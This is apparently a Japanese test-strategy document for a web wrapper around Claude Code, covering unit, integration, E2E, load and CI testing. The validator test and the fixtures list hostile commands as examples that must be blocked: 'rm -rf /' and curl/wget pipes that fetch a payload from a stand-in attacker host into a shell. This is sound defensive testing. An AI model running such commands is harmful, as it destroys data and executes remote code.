# Claude Code Web Wrapper - テスト戦略

## テスト全体戦略

### テストピラミッド
```
                  /\
                 /  \
                / E2E \         ← 少数の重要シナリオ
               /______\
              /        \
             /Integration\      ← API・コンポーネント統合
            /__________\
           /            \
          /    Unit      \     ← 多数の小さなテスト
         /________________\
```

### テストカバレッジ目標
```yaml
全体カバレッジ: > 80%
クリティカルパス: 100%

レイヤー別:
  - Unit Tests: > 85%
  - Integration Tests: > 70%
  - E2E Tests: > 60% (主要フロー)
```

## Unit Testing (単体テスト)

### フロントエンド Unit Tests

#### A. Terminal Component テスト
```javascript
// tests/terminal/Terminal.test.js
import { Terminal } from '../../src/terminal/Terminal.js';
import { jest } from '@jest/globals';

describe('Terminal Component', () => {
  let terminal;
  let mockContainer;

  beforeEach(() => {
    mockContainer = document.createElement('div');
    terminal = new Terminal(mockContainer, {
      theme: 'dark',
      fontSize: 14
    });
  });

  afterEach(() => {
    terminal.destroy();
    jest.clearAllMocks();
  });

  test('should initialize xterm.js with correct options', () => {
    expect(terminal.xterm).toBeDefined();
    expect(terminal.xterm.options.fontSize).toBe(14);
    expect(terminal.xterm.options.theme.background).toBe('#1a1a1a');
  });

  test('should handle input and emit to socket', () => {
    const mockSocket = { emit: jest.fn() };
    terminal.setSocket(mockSocket);
    
    terminal.xterm.onData('test command\r');
    
    expect(mockSocket.emit).toHaveBeenCalledWith('terminal-input', {
      sessionId: expect.any(String),
      data: 'test command\r',
      timestamp: expect.any(Number)
    });
  });

  test('should handle resize correctly', () => {
    const mockSocket = { emit: jest.fn() };
    terminal.setSocket(mockSocket);
    
    terminal.resize(80, 24);
    
    expect(terminal.xterm.cols).toBe(80);
    expect(terminal.xterm.rows).toBe(24);
    expect(mockSocket.emit).toHaveBeenCalledWith('terminal-resize', {
      sessionId: expect.any(String),
      cols: 80,
      rows: 24
    });
  });

  test('should sanitize output before display', () => {
    const maliciousOutput = '<script>alert("xss")</script>normal text';
    terminal.write(maliciousOutput);
    
    // xterm.js の内容を確認（スクリプトタグが除去されている）
    const displayedText = terminal.xterm.buffer.active.getLine(0).translateToString();
    expect(displayedText).not.toContain('<script>');
    expect(displayedText).toContain('normal text');
  });
});
```

#### B. Mobile Components テスト
```javascript
// tests/mobile/VirtualKeyboard.test.js
import { VirtualKeyboard } from '../../src/mobile/VirtualKeyboard.js';

describe('Virtual Keyboard', () => {
  let keyboard;
  let mockTerminal;

  beforeEach(() => {
    mockTerminal = {
      focus: jest.fn(),
      write: jest.fn()
    };
    keyboard = new VirtualKeyboard(mockTerminal);
  });

  test('should handle special key presses', () => {
    const tabKey = keyboard.container.querySelector('[data-key="Tab"]');
    
    tabKey.click();
    
    expect(mockTerminal.write).toHaveBeenCalledWith('\t');
  });

  test('should handle control key combinations', () => {
    const ctrlC = keyboard.container.querySelector('[data-key="Control+c"]');
    
    ctrlC.click();
    
    expect(mockTerminal.write).toHaveBeenCalledWith('\x03'); // Ctrl+C
  });

  test('should show/hide based on mobile detection', () => {
    // モバイル環境をモック
    Object.defineProperty(window, 'innerWidth', { value: 375 });
    Object.defineProperty(window, 'ontouchstart', { value: true });
    
    keyboard.updateVisibility();
    
    expect(keyboard.container.style.display).not.toBe('none');
  });
});
```

### バックエンド Unit Tests

#### A. PTY Service テスト
```javascript
// tests/services/PTYService.test.js
import { PTYService } from '../../server/services/PTYService.js';
import { jest } from '@jest/globals';

// node-pty をモック
jest.mock('node-pty');
import pty from 'node-pty';

describe('PTY Service', () => {
  let ptyService;
  let mockPtyProcess;

  beforeEach(() => {
    mockPtyProcess = {
      write: jest.fn(),
      resize: jest.fn(),
      kill: jest.fn(),
      onData: jest.fn(),
      onExit: jest.fn()
    };
    
    pty.spawn.mockReturnValue(mockPtyProcess);
    ptyService = new PTYService();
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  test('should spawn claude-code process correctly', () => {
    const sessionId = 'test-session';
    
    const process = ptyService.spawn(sessionId, 'claude-code');
    
    expect(pty.spawn).toHaveBeenCalledWith('claude-code', [], {
      name: 'xterm-color',
      cols: 80,
      rows: 24,
      cwd: expect.any(String),
      env: expect.objectContaining({
        TERM: 'xterm-256color',
        COLORTERM: 'truecolor'
      })
    });
    expect(ptyService.processes.has(sessionId)).toBe(true);
  });

  test('should handle process termination cleanup', () => {
    const sessionId = 'test-session';
    ptyService.spawn(sessionId);
    
    ptyService.kill(sessionId);
    
    expect(mockPtyProcess.kill).toHaveBeenCalled();
    expect(ptyService.processes.has(sessionId)).toBe(false);
  });

  test('should validate command whitelist', () => {
    const sessionId = 'test-session';
    
    expect(() => {
      ptyService.spawn(sessionId, 'dangerous-command');
    }).toThrow('Command not allowed');
  });
});
```

#### B. Security Validation テスト
```javascript
// tests/utils/validator.test.js
import { validateTerminalInput } from '../../server/utils/validator.js';

describe('Security Validator', () => {
  test('should allow safe commands', () => {
    const safeCommands = [
      'git status',
      'npm install',
      'claude-code --help',
      'ls -la'
    ];

    safeCommands.forEach(command => {
      expect(validateTerminalInput(command)).toBe(true);
    });
  });

  test('should block dangerous commands', () => {
    const dangerousCommands = [
      'rm -rf /',
      'sudo rm -rf /var',
      'chmod 777 /etc/passwd',
      'wget malicious.com/script.sh | sh',
      'curl attacker.com/payload | bash'
    ];

    dangerousCommands.forEach(command => {
      expect(validateTerminalInput(command)).toBe(false);
    });
  });

  test('should enforce input length limits', () => {
    const longInput = 'a'.repeat(2048);
    expect(validateTerminalInput(longInput)).toBe(false);
  });

  test('should handle edge cases', () => {
    expect(validateTerminalInput(null)).toBe(false);
    expect(validateTerminalInput(undefined)).toBe(false);
    expect(validateTerminalInput('')).toBe(false);
    expect(validateTerminalInput(123)).toBe(false);
  });
});
```

## Integration Testing (統合テスト)

### WebSocket 通信テスト
```javascript
// tests/integration/websocket.test.js
import { createServer } from 'http';
import { Server } from 'socket.io';
import Client from 'socket.io-client';
import { app } from '../../server/app.js';

describe('WebSocket Integration', () => {
  let httpServer;
  let httpServerAddr;
  let ioServer;
  let clientSocket;

  beforeAll((done) => {
    httpServer = createServer(app);
    ioServer = new Server(httpServer);
    
    httpServer.listen(() => {
      httpServerAddr = httpServer.address();
      done();
    });
  });

  afterAll(() => {
    ioServer.close();
    httpServer.close();
  });

  beforeEach((done) => {
    clientSocket = new Client(`http://localhost:${httpServerAddr.port}`);
    clientSocket.on('connect', done);
  });

  afterEach(() => {
    clientSocket.close();
  });

  test('should establish WebSocket connection', (done) => {
    clientSocket.emit('create-session', { userId: 'test-user' });
    
    clientSocket.on('session-created', (data) => {
      expect(data.sessionId).toBeDefined();
      expect(data.status).toBe('connected');
      done();
    });
  });

  test('should handle terminal input/output', (done) => {
    clientSocket.emit('create-session', { userId: 'test-user' });
    
    clientSocket.on('session-created', (data) => {
      clientSocket.emit('terminal-input', {
        sessionId: data.sessionId,
        data: 'echo "hello world"\r'
      });
    });
    
    clientSocket.on('terminal-output', (data) => {
      expect(data.data).toContain('hello world');
      done();
    });
  });

  test('should handle session cleanup on disconnect', (done) => {
    let sessionId;
    
    clientSocket.emit('create-session', { userId: 'test-user' });
    
    clientSocket.on('session-created', (data) => {
      sessionId = data.sessionId;
      clientSocket.disconnect();
    });
    
    // セッションがクリーンアップされることを確認
    setTimeout(() => {
      // サーバーサイドでセッションが削除されていることを確認
      expect(ioServer.sockets.adapter.rooms.has(sessionId)).toBe(false);
      done();
    }, 100);
  });
});
```

### API エンドポイントテスト
```javascript
// tests/integration/api.test.js
import request from 'supertest';
import { app } from '../../server/app.js';

describe('API Endpoints', () => {
  test('GET / should serve the main page', async () => {
    const response = await request(app).get('/');
    
    expect(response.status).toBe(200);
    expect(response.headers['content-type']).toMatch(/text\/html/);
  });

  test('GET /health should return health status', async () => {
    const response = await request(app).get('/health');
    
    expect(response.status).toBe(200);
    expect(response.body).toEqual({
      status: 'healthy',
      timestamp: expect.any(String),
      uptime: expect.any(Number)
    });
  });

  test('POST /api/upload should handle file uploads', async () => {
    const response = await request(app)
      .post('/api/upload')
      .attach('file', Buffer.from('test content'), 'test.txt')
      .expect(200);
    
    expect(response.body.filename).toBe('test.txt');
    expect(response.body.size).toBe(12);
  });

  test('should return 404 for unknown routes', async () => {
    const response = await request(app).get('/unknown');
    expect(response.status).toBe(404);
  });
});
```

## E2E Testing (End-to-End テスト)

### Playwright テスト設定
```javascript
// playwright.config.js
import { defineConfig, devices } from '@playwright/test';

export default defineConfig({
  testDir: './tests/e2e',
  fullyParallel: true,
  forbidOnly: !!process.env.CI,
  retries: process.env.CI ? 2 : 0,
  workers: process.env.CI ? 1 : undefined,
  reporter: 'html',
  
  use: {
    baseURL: 'http://127.0.0.1:3000',
    trace: 'on-first-retry',
    screenshot: 'only-on-failure',
    video: 'retain-on-failure'
  },

  projects: [
    {
      name: 'chromium',
      use: { ...devices['Desktop Chrome'] }
    },
    {
      name: 'Mobile Chrome',
      use: { ...devices['Pixel 5'] }
    },
    {
      name: 'Mobile Safari',
      use: { ...devices['iPhone 12'] }
    }
  ],

  webServer: {
    command: 'npm run dev',
    url: 'http://127.0.0.1:3000',
    reuseExistingServer: !process.env.CI
  }
});
```

### E2E テストケース
```javascript
// tests/e2e/terminal-workflow.spec.js
import { test, expect } from '@playwright/test';

test.describe('Terminal Workflow', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
    await page.waitForSelector('#terminal');
  });

  test('should connect and execute basic commands', async ({ page }) => {
    // 接続状態の確認
    await expect(page.locator('#connection-status')).toContainText('Connected');
    
    // コマンド実行
    await page.fill('[data-testid="terminal-input"]', 'echo "Hello World"');
    await page.press('[data-testid="terminal-input"]', 'Enter');
    
    // 出力の確認
    await expect(page.locator('#terminal')).toContainText('Hello World');
  });

  test('should handle mobile virtual keyboard', async ({ page, isMobile }) => {
    test.skip(!isMobile, 'Mobile-only test');
    
    // 仮想キーボードの表示
    await page.tap('[data-testid="show-keyboard"]');
    await expect(page.locator('#virtual-keyboard')).toBeVisible();
    
    // 特殊キーの動作
    await page.tap('[data-key="Tab"]');
    await page.tap('[data-key="Escape"]');
    await page.tap('[data-key="Control+c"]');
    
    // コマンド実行の確認
    // (実際の動作は統合的に確認)
  });

  test('should persist session across page reloads', async ({ page }) => {
    // コマンド履歴の作成
    await page.fill('[data-testid="terminal-input"]', 'pwd');
    await page.press('[data-testid="terminal-input"]', 'Enter');
    
    const initialOutput = await page.locator('#terminal').textContent();
    
    // ページリロード
    await page.reload();
    await page.waitForSelector('#terminal');
    
    // セッション復旧の確認
    await expect(page.locator('#connection-status')).toContainText('Connected');
    
    // 履歴の確認（上矢印キー）
    await page.press('[data-testid="terminal-input"]', 'ArrowUp');
    await expect(page.locator('[data-testid="terminal-input"]')).toHaveValue('pwd');
  });
});
```

### モバイル特化 E2E テスト
```javascript
// tests/e2e/mobile-experience.spec.js
import { test, expect, devices } from '@playwright/test';

test.use({ ...devices['iPhone 12'] });

test.describe('Mobile Experience', () => {
  test('should handle touch gestures', async ({ page }) => {
    await page.goto('/');
    await page.waitForSelector('#terminal');
    
    // スワイプジェスチャー（コマンド履歴）
    const terminal = page.locator('#terminal');
    
    // 右スワイプ（前のコマンド）
    await terminal.swipe({ direction: 'right' });
    
    // 左スワイプ（次のコマンド）
    await terminal.swipe({ direction: 'left' });
    
    // 上スワイプ（仮想キーボード表示）
    await terminal.swipe({ direction: 'up' });
    await expect(page.locator('#virtual-keyboard')).toBeVisible();
  });

  test('should adapt to orientation changes', async ({ page }) => {
    await page.goto('/');
    
    // 縦向き確認
    await page.setViewportSize({ width: 375, height: 667 });
    await expect(page.locator('.mobile-toolbar')).toBeVisible();
    await expect(page.locator('#virtual-keyboard')).toBeVisible();
    
    // 横向き確認
    await page.setViewportSize({ width: 667, height: 375 });
    await expect(page.locator('.mobile-toolbar')).toBeVisible();
    
    // レイアウトの適応を確認
    const keyboardHeight = await page.locator('#virtual-keyboard').evaluate(
      el => getComputedStyle(el).height
    );
    expect(parseInt(keyboardHeight)).toBeLessThan(200); // 横向きでは高さが制限される
  });

  test('should provide haptic feedback', async ({ page }) => {
    // Haptic API のモック（実際のデバイスでのみ動作）
    await page.addInitScript(() => {
      window.navigator.vibrate = (pattern) => {
        window._vibratePattern = pattern;
        return true;
      };
    });
    
    await page.goto('/');
    
    // ボタン押下でハプティックフィードバック
    await page.tap('[data-testid="quick-action-git"]');
    
    const vibratePattern = await page.evaluate(() => window._vibratePattern);
    expect(vibratePattern).toBeDefined();
  });
});
```

## Performance Testing (パフォーマンステスト)

### ロードテスト
```javascript
// tests/performance/load.test.js
import { check, sleep } from 'k6';
import http from 'k6/http';
import ws from 'k6/ws';

export let options = {
  stages: [
    { duration: '2m', target: 10 },  // 2分で10ユーザーまで増加
    { duration: '5m', target: 10 },  // 5分間10ユーザー維持
    { duration: '2m', target: 50 },  // 2分で50ユーザーまで増加
    { duration: '5m', target: 50 },  // 5分間50ユーザー維持
    { duration: '2m', target: 0 },   // 2分で0ユーザーまで減少
  ],
  thresholds: {
    http_req_duration: ['p(95)<500'], // 95%のリクエストが500ms以下
    ws_connecting: ['p(95)<1000'],    // WebSocket接続が1秒以下
  }
};

export default function () {
  // HTTP ロードテスト
  let response = http.get('http://localhost:3000/');
  check(response, {
    'status is 200': (r) => r.status === 200,
    'page loads in <3s': (r) => r.timings.duration < 3000
  });
  
  // WebSocket ロードテスト
  let res = ws.connect('ws://localhost:3000/', {}, function (socket) {
    socket.on('open', () => {
      socket.send(JSON.stringify({
        type: 'create-session',
        userId: `user-${__VU}`
      }));
    });
    
    socket.on('message', (data) => {
      let message = JSON.parse(data);
      if (message.type === 'session-created') {
        // ターミナルコマンドの実行
        socket.send(JSON.stringify({
          type: 'terminal-input',
          sessionId: message.sessionId,
          data: 'echo "load test"\r'
        }));
      }
    });
    
    sleep(1);
    socket.close();
  });
  
  sleep(1);
}
```

### メモリリーク検出
```javascript
// tests/performance/memory-leak.test.js
import { test, expect } from '@playwright/test';

test('should not have memory leaks during extended use', async ({ page }) => {
  await page.goto('/');
  
  // 初期メモリ使用量
  const initialMemory = await page.evaluate(() => performance.memory.usedJSHeapSize);
  
  // 多数のコマンド実行をシミュレート
  for (let i = 0; i < 100; i++) {
    await page.fill('[data-testid="terminal-input"]', `echo "test ${i}"`);
    await page.press('[data-testid="terminal-input"]', 'Enter');
    await page.waitForTimeout(50);
  }
  
  // ガベージコレクション強制実行
  await page.evaluate(() => {
    if (window.gc) window.gc();
  });
  
  // 最終メモリ使用量
  const finalMemory = await page.evaluate(() => performance.memory.usedJSHeapSize);
  
  // メモリリークがないことを確認（増加率が50%未満）
  const memoryIncrease = (finalMemory - initialMemory) / initialMemory;
  expect(memoryIncrease).toBeLessThan(0.5);
});
```

## Test Automation (テスト自動化)

### CI/CD パイプライン
```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        node-version: [16, 18, 20]
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Use Node.js ${{ matrix.node-version }}
      uses: actions/setup-node@v3
      with:
        node-version: ${{ matrix.node-version }}
        cache: 'npm'
    
    - run: npm ci
    - run: npm run lint
    - run: npm run test:unit
    - run: npm run test:coverage
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3

  integration-tests:
    runs-on: ubuntu-latest
    
    services:
      redis:
        image: redis
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
    - uses: actions/checkout@v3
    - uses: actions/setup-node@v3
      with:
        node-version: 18
    
    - run: npm ci
    - run: npm run test:integration

  e2e-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    - uses: actions/setup-node@v3
      with:
        node-version: 18
    
    - name: Install dependencies
      run: npm ci
    
    - name: Install Playwright
      run: npx playwright install
    
    - name: Run E2E tests
      run: npm run test:e2e
    
    - name: Upload test results
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: playwright-report
        path: playwright-report/

  security-scan:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Run security audit
      run: npm audit --audit-level high
    
    - name: Run OWASP ZAP scan
      uses: zaproxy/action-baseline@v0.7.0
      with:
        target: 'http://localhost:3000'
```

### テストデータ管理
```javascript
// tests/fixtures/testData.js
export const testUsers = {
  validUser: {
    id: 'user-123',
    email: 'test@example.com',
    preferences: {
      theme: 'dark',
      fontSize: 14
    }
  },
  
  invalidUser: {
    id: 'invalid-user',
    email: 'invalid-email'
  }
};

export const terminalCommands = {
  safe: [
    'git status',
    'npm list',
    'claude-code --help',
    'ls -la'
  ],
  
  dangerous: [
    'rm -rf /',
    'sudo shutdown',
    'wget malicious.com/script | sh'
  ]
};

export const mockResponses = {
  sessionCreated: {
    type: 'session-created',
    sessionId: 'mock-session-123',
    status: 'connected'
  },
  
  terminalOutput: {
    type: 'terminal-output',
    sessionId: 'mock-session-123',
    data: 'mock command output\r\n'
  }
};
```

---

**更新日**: 2025-01-08  
**バージョン**: 1.0  
**ステータス**: 初版作成